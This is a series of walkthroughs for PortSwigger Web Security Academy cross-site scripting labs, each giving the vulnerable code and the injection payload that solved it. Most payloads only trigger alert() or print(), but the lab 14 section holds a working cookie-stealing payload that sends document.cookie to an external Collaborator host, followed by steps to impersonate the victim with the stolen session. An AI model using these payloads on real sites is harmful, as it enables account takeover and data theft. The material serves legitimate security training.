02 Stored XSS into HTML context with nothing encoded
====================================================

This lab contains a stored cross-site scripting vulnerability in the comment
functionality.

To solve this lab, submit a comment that calls the alert function when the blog
post is viewed.

Reference: https://portswigger.net/web-security/cross-site-scripting/stored

There is a functionality to post comments in each blog post:

![img](media/8d560ec12374df0709a4c7f0077267ef.png)

If you check the blog post again you see the alert popping:

![img](media/66cf231fb7888ad277f5fd4cf1632522.png)

04 DOM XSS in innerHTML sink using source location.search
=========================================================

This lab contains a DOM-based cross-site scripting vulnerability in the search
blog functionality. It uses an innerHTML assignment, which changes the HTML
contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert
function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/dom-based

There is a search function in "/?search=":

![img](media/1f2f2edfc444a90b26dd03226e282444.png)

In the source code we see the sink:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d722bead9cf6714a3f3bed98f1604a3b.png)

The HTML content of the searchMessage, a span HTML element, is generated from
the content of the “search" GET parameter of the request. We can pop an alert
with the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
< src=x onerror=alert(1) />
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d656fa6825f56bc69ce42131cec30d38.png)

05 DOM XSS in jQuery anchor href attribute sink using location.search source
============================================================================

This lab contains a DOM-based cross-site scripting vulnerability in the submit
feedback page. It uses the jQuery library's \$ selector function to find an
anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie.

References:

-   https://portswigger.net/web-security/cross-site-scripting/dom-based

This is the sink in the "Submit Feedback" page:

![img](media/23e06101896c17ae6d7b3df1f4581d9a.png)

And the url of the "Submit Feedback" page is
https://0af5007903b0426b803b4e9100cb0023.web-security-academy.net/feedback?returnPath=/:

![img](media/8d03aa45d15022d6039736d296457e04.png)

It is possible to use a Javascript url like:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/feedback?returnPath=javascript:alert(document.cookie)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/e804dfee40eddbec58bfe4c1d914831b.png)

06 DOM XSS in jQuery selector sink using a hashchange event
===========================================================

This lab contains a DOM-based cross-site scripting vulnerability on the home
page. It uses jQuery's \$() selector function to auto-scroll to a given post,
whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print()
function in their browser.

References:

-   https://portswigger.net/web-security/cross-site-scripting/dom-based

This is the problematic code in the Home page:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/6411e7ec475b480daaaddda254d95801.png)

To exploit it, it is possible to use the same payload as in
https://portswigger.net/web-security/cross-site-scripting/dom-based:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='< src=1 onerror=print(1)>'">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/71a471089206aaf79cd95c6e5992766d.png)

07 Reflected XSS into attribute with angle brackets HTML-encoded
================================================================

This lab contains a reflected cross-site scripting vulnerability in the search
blog functionality where angle brackets are HTML-encoded. To solve this lab,
perform a cross-site scripting attack that injects an attribute and calls the
alert function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

![img](media/80a81e4dee6bf730d2419a2310a417a0.png)

When we search “aaaa” it becomes the “value” of this HTML element:

![img](media/1c2efa3fba5e25a4f8462065aabca069.png)

With this payload the alert pops:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
" autofocus onfocus=alert(1) x="
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d89489125cb1b862e60691ab8acc075d.png)

This is the HTML content which explains why the payload worked:

![img](media/54367d964a70b3aaa889976786dc9bc2.png)

08 Stored XSS into anchor href attribute with double quotes HTML-encoded
========================================================================

This lab contains a stored cross-site scripting vulnerability in the comment
functionality. To solve this lab, submit a comment that calls the alert function
when the comment author name is clicked.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

![img](media/01f6e3fb4c92a033f4d5483f796ef005.png)

It is possible to post comments:

![img](media/7449228ee00b4a76fa3128713591668f.png)

This is the HTML element generated:

![img](media/58029c2e178a1e20d00a3658561b3519.png)

When the user name is clicked, it redirects to the website set in the comment:

![img](media/55c0ff631e00d0e63dad6d5c93a506c8.png)

![img](media/6fc095a309559f48fa41acdddf9ab42f.png)

We will set the website to a javascript url:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
javascript:alert(1)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/8958dc506c36b0c842305a0de1b1d50c.png)

When clicked, the alert pops:

![img](media/42eab22312a8ef08d995b7ada1b198a7.png)

09 Reflected XSS into a JavaScript string with angle brackets HTML encoded
==========================================================================

This lab contains a reflected cross-site scripting vulnerability in the search
query tracking functionality where angle brackets are encoded. The reflection
occurs inside a JavaScript string. To solve this lab, perform a cross-site
scripting attack that breaks out of the JavaScript string and calls the alert
function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

![img](media/c598e7d8a7dbc44ca38a92c0374b05ea.png)

When we search “aaaa”, it generates a page with the following code:

![img](media/f855d0ef5b89395d384a460b5b99aaea.png)

With a payload like:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
';alert(1);echo 'a
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We see the code is now:

![img](media/6c85cc4b8f2494715dcbc86ff5bfc25f.png)

With this payload the alert pops:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
';alert(1)//
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/a1b4bc32e92d1eb57be94f46cd9c1184.png)

11 DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
=====================================================================================

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS
expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML
nodes containing the ng-app attribute (also known as an AngularJS directive).
When a directive is added to the HTML code, you can execute JavaScript
expressions within double curly braces. This technique is useful when angle
brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an
AngularJS expression and calls the alert function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/dom-based

There is a search function:

![img](media/714dab7f8eb555b545b1e70d830df0ae.png)

The string is part of a h1 tag:

![img](media/dacf952e9c78bc0ba6e053083d5290ae.png)

Searching "\<'\>" we find "\>", "\<" and "'" are HTML-encoded:

![img](media/f43ce75bedba90c226442e625068a8b3.png)

Using curly-braces we find this payload is interpreted:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{{1== 1 ? "Yes, it is equal" : "No, it is not"}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/3bcfaa9fe7d9f3fc98049fa548dfdaba.png)

![img](media/4e880a7cd8091076ec26288a26b6abe7.png)

I could pop an alert with the example from
https://stackoverflow.com/questions/66759842/what-does-object-constructor-constructoralert1-actually-do-in-javascript:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 {{constructor.constructor('alert(1)')()}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/f7f13c4302b81ca9db68a9dd36491747.png)

The official solution is similar: {{\$on.constructor('alert(1)')()}}

12 Reflected DOM XSS
====================

This lab demonstrates a reflected DOM vulnerability. Reflected DOM
vulnerabilities occur when the server-side application processes data from a
request and echoes the data in the response. A script on the page then processes
the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/dom-based

There is a Javascript script in /resources/js/searchResults.js, which is:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The sink should be:

![img](media/33a7f82fd06ac42cc8fa72a4fba06322.png)

There is a request to /search-results

![img](media/aa02eb800b52a263e870cc5ef92a854e.png)

The response to /search-results:

![img](media/9f8441a10fa5d8b5032d00370b479b42.png)

The correct payload from the solution:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\"-alert(1)}//
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-   Server adds  to " so " becomes "".

-   } closes the JSON object

-   // comments the rest of the object

![img](media/74ae90734b0b0f445d5a66292ca51ed5.png)

13 Stored DOM XSS
=================

This lab demonstrates a stored DOM vulnerability in the blog comment
functionality. To solve this lab, exploit this vulnerability to call the alert()
function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/dom-based

It is possible to post comments:

![img](media/9c5ea1c01a563301fc81828e11bacacd.png)

It generates the following HTML code:

![img](media/c49bf7505bf483b09b3495cc34747b16.png)

We can try the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</p>< src=x onerror=alert(1) /><p>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/9131744cdeab41be4817406d54200d35.png)

It pops an alert:

![img](media/9e1663919e40affb7b00c0c466674cba.png)

14 Exploiting cross-site scripting to steal cookies
===================================================

This lab contains a stored XSS vulnerability in the blog comments function. A
simulated victim user views all comments after they are posted. To solve the
lab, exploit the vulnerability to exfiltrate the victim's session cookie, then
use this cookie to impersonate the victim.

Note: To prevent the Academy platform being used to attack third parties, our
firewall blocks interactions between the labs and arbitrary external systems. To
solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that
does not require Burp Collaborator. However, it is far less subtle than
exfiltrating the cookie.

References:

-   https://portswigger.net/web-security/cross-site-scripting/exploiting

First we test the XSS in one of the blog posts. This payload works:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</p>< src=x onerror=alert(1) /><p>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/91fe4c1e85f288b8b8bd02de8d51b2ca.png)

Next we try the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</p>< src=x onerror='document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie' /><p>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We receive cookies in Burp Collaborator:

![img](media/fa80ee60974bae2dbbe737be4db65862.png)

Then intercept the request to the Home page and add these cookies:

![img](media/9fb16a3605e8521cfa43757ebb0252d9.png)

18 Reflected XSS into HTML context with all tags blocked except custom ones
===========================================================================

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom
tag and automatically alerts document.cookie.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

The content of the search is reflected inside a h1 HTML element:

![img](media/b018bae71b411d989936940912f99246.png)

I will send the following payload to Intruder:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<tag attrib=alert(1)>text</tag>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

First test the attributes:

![img](media/b9a061d5445798d443650cd8c8881709.png)

It seems all attributes are valid:

![img](media/234cf16a0f539515126f40830ec36e2e.png)

Then the tags:

![img](media/8f5417485bf4ba8cec4830e803c6f83b.png)

These are valid: • animatetransform • animatemotion • custom tags • animate •
iframe2 • audio2 • image2 • image3 • input2 • input3 • input4 • video2 • 2 • set
• a2

![img](media/6c13c65a0f987213732e575bbbc80bba.png)

For example we can pop an alert with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

19 Reflected XSS with some SVG markup allowed
=============================================

This lab has a simple reflected XSS vulnerability. The site is blocking common
tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the alert()
function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

The content of the search is reflected inside a h1 HTML element:

![img](media/b018bae71b411d989936940912f99246.png)

In this case it seems not even custom tags are allowed. I will test all possible
tags:

![img](media/72f62d2566899ae9c1ba8611b3ca2d2c.png)

The valid tags are: - animatetransform - image - title - svg

![img](media/ac78c04aafc6038dcd553b752b8db002.png)

And then all possible attributes: - onbegin

![img](media/df6163bac0d5273623f025a19b5af1ee.png)

We get this payload from
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet:

![img](media/9cbc91b2367c2cbb30a63242b4afe5a9.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<svg><animatetransform onbegin=alert(1) attributeName=transform>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/02809548f2c592a21860bfcbd6cd561f.png)

20 Reflected XSS in canonical link tag
======================================

This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that
injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press
the following key combinations:

ALT+SHIFT+X CTRL+ALT+X Alt+X

Please note that the intended solution to this lab is only possible in Chrome.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

-   https://portswigger.net/research/xss-in-hidden-input-fields

![img](media/1fd620bbac0740a767f2013d300cdbae.png)

![img](media/e61fe125479bd6f0a751796f6f7c3265.png)

![img](media/805bf38a395f6917c656fa30c468510d.png)

The page allows to post comments:

![img](media/2773de9351e04f3095465a47287bd86a.png)

We find the link with 'rel="canonical"' in the head section of the HTML page:

![img](media/a40ec073fda490ab1eae160d4187d15a.png)

We would like to turn it to:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<link rel="canonical" accesskey="X" onclick="alert(1)" />
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In the /post endpoint it is necessary to send a correct postId, but it is
possible to add more parameters which change the content of the href attribute:

![img](media/52608d063766926d815a87368195efd6.png)

A correct payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/post?postId=1&a=b'accesskey='X'onclick='alert(1)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/df9c217459be143754ef02274ea04697.png)

![img](media/5f6ea8531ee8d4fcb65a1f1071d6d4ec.png)

22 Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
======================================================================================================================

This lab contains a reflected cross-site scripting vulnerability in the search
query tracking functionality where angle brackets and double are HTML encoded
and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the
JavaScript string and calls the alert function.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

![img](media/5ae0fd3dd916f4cf47cc44ec20af79a9.png)

The content of the search is reflected inside a h1 HTML element and a variable
in Javascript with single quotes:

![img](media/d57d3be039045ae9a1e154682e1eb421.png)

Single quote is escaped and “\<”, "\>" and ‘"’ are HTML-encoded:

![img](media/145ca47ada18b3c6d5f966a9f05da58c.png)

A payload that works is:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\';alert(1);//
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/dcf198d2272dd53a3d73ee7a4d6bcd1d.png)

23 Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
===========================================================================================================================

This lab contains a stored cross-site scripting vulnerability in the comment
functionality.

To solve this lab, submit a comment that calls the alert function when the
comment author name is clicked.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

![img](media/2943e2a232199aa56e4b52e54823e9a4.png)

There is a function to post comments:

![img](media/d65e5349d656de0854dc2e6c01b55622.png)

It generates the following HTML code:

![img](media/f40a009e4d792a21aea368cd03e7ea26.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<a id="author" href="http://test4.com" onclick="var tracker={track(){}};tracker.track('http://test4.com');">test2</a>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We see single quote and backslash characters are indeed escaped and angle
brackets and double quotes are HTML-encoded:

![img](media/6daed45836eeff513e7902a30aa7de21.png)

We will use “'” next:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://test4.com&apos;);alert(1);//
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /post/comment HTTP/2
...

csrf=e8yz3UQ62qX7CBfs9PFEanjwdYjzbaMz&postId=1&comment=test1&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com%26apos;);alert(1)%3b//
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When clicking the username an alert pops:

![img](media/27cd9369fd0a55c98acb2bbc0f633c43.png)

24 Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks
============================================================================================================

This lab contains a reflected cross-site scripting vulnerability in the search
blog functionality. The reflection occurs inside a template string with angle
brackets, single, and double quotes HTML encoded, and backticks escaped. To
solve this lab, perform a cross-site scripting attack that calls the alert
function inside the template string.

References:

-   https://portswigger.net/web-security/cross-site-scripting/contexts

![img](media/60225f0453670a2c4349cab9632ccae6.png)

The content of the search is reflected inside the variable “message”, a template
literal:

![img](media/d0157032741e24de90c448fa625ec70e.png)

We can execute this payload inside the template literal:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
${alert(1)}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/689fd0345fb6b1c5486aa8d01e92a02c.png)
